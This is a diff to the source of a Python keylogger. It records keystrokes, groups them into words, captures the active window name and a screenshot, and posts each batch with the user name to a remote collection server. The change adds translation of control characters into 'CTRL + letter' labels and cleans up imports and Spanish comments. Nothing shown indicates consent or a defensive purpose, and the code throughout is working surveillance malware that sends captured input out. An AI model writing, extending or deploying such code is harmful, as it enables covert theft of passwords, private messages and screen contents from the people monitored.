@@ -4,9 +4,10 @@ from pynput import mouse
 from modules import consumerServer
 from utils.utils import *
 from modules import screenshot as sc
-from pynput import mouse, keyboard
-from time import sleep, time
+from pynput import mouse, keyboard as pynput_keyboard
+from time import time
 import threading
+
 
 def logMouse():
     """
@@ -43,10 +44,22 @@ def logMouse():
     with mouse.Listener(on_click=_on_click) as listener:
         listener.join()
 
+def get_key_str(key):
+    if hasattr(key, 'char') and key.char:
+        return key.char
+    else:
+        return str(key)
+
+# Mapeo de caracteres de control a combinaciones de teclas
+control_char_mapping = {
+    chr(i): f'CTRL + {chr(i + 64)}' for i in range(1, 27)
+}
+
+
+def translate_control_chars(char_sequence):
+    return ' '.join(control_char_mapping.get(char, char) for char in char_sequence)
+
 def logKeyboard():
-    """
-    Log keyboard key presses and group them into words
-    """
     print("[Keyboard] Keyboard logging started...")
     pressed_keys = []
     last_key_time = time()
@@ -57,7 +70,10 @@ def logKeyboard():
         if pressed_keys:
             window_name = getActiveWindowInfo("name")
             typed_word = ''.join(pressed_keys)
-            img = sc.take_screenshot(save_image=True)  # Guarda imagen
+            # Revisar si hay caracteres de control en typed_word
+            if any(c in control_char_mapping for c in typed_word):
+                typed_word = translate_control_chars(typed_word)  # Traducir caracteres de control solo si es necesario
+            img = sc.take_screenshot(save_image=True)
             print(f"{timestamp()} {USER} {window_name} typed: {typed_word}")
             session.post(consumerServer.SERVER_ADDR, json={
                 "timestamp": timestamp(),
@@ -68,25 +84,22 @@ def logKeyboard():
                 "typed_word": typed_word,
                 "screenshot": img
             })
-            pressed_keys = []
+            pressed_keys = []  # Limpiar pressed_keys
+
 
     def on_press(key):
         nonlocal last_key_time, pressed_keys, timer
         try:
-            # Captura la entrada de teclado y toma la captura
-            if key == keyboard.Key.space:
+            if key == pynput_keyboard.Key.space:
                 key_char = ' '
             else:
                 key_char = key.char
             pressed_keys.append(key_char)
             last_key_time = time()
-
-            # Margen de tiempo para la detección completa de la entrada de teclado
             if timer is not None:
                 timer.cancel()
             timer = threading.Timer(2, send_data)
             timer.start()
-
         except AttributeError:
             # Control de casos de teclas especiales
             pass
@@ -95,11 +108,8 @@ def logKeyboard():
         pass
 
     # Ejecuta la función correspondiente al pulsar una tecla
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    with pynput_keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
-
-
-
 
 
 
